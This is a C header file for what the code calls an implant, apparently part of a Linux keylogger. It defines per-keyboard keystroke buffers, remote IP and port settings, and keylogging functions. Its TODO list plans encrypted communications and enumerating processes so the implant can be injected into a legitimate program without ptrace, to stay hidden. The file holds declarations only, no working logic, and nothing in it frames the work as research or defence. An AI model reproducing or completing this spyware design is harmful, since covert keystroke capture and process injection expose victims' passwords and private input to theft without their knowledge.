
#ifndef IMPLANT_H
#define IMPLANT_H

/*
    TODO:

    2. cleanup select handling so that it doesn't suck massive balls

    3. add support for TLS communications / some kind of enc.

    4. enumerate process to see which can be interesting to inject into

    5. use ptrace-less process injection to inject this in a legit program
*/


#include <sys/types.h>
#include <stdint.h>
#include <sys/queue.h>

/*
    represents whatever data is currently logged for a single keyboard
    also holds its file descriptor
*/
typedef struct keyboard_s keyboard_t;
struct keyboard_s {
    int fd;

    ssize_t nb_characters;

    char buffer[2048];
    char name[64];

    TAILQ_ENTRY(keyboard_s) devices;
};



/*
    contains project settings, such as target
    port & IP address, whether debug mode is enabled
    or stuff like this
*/
typedef struct implant_s {

    /* remote connection settings */
    unsigned short port;
    char ip[256];

    /* keyboard settings */
    char locale[20];
    TAILQ_HEAD(listhead, keyboard_s) kbd;

} implant_t;


#define SUCCESSFUL 1
#define ERROR 0

#include <stdio.h> /* necessary for the dprintf in the macro */

#ifndef DEBUG_LOG
#define DEBUG_LOG(s, ...) \
    do { \
        dprintf(2, s, ##__VA_ARGS__); dprintf(2, "\n"); \
    } while (0)
#endif



#define KEY_PRESSED 1
#define KEY_RELEASED 0

// opt.c
int parse_user_input(int, char **, implant_t *);

// logger.c
void keylog(implant_t *);

// keyboard.c
int get_locale(implant_t *);
void fetch_available_keyboards(implant_t *);

// utils.c
int read_file(char const *, char **);
size_t get_array_size(uint8_t **);
char *remove_repeating_whitespaces(char *);
void free_tab(uint8_t **);
char **tabgen(const char *, char);


#endif /* IMPLANT_H */
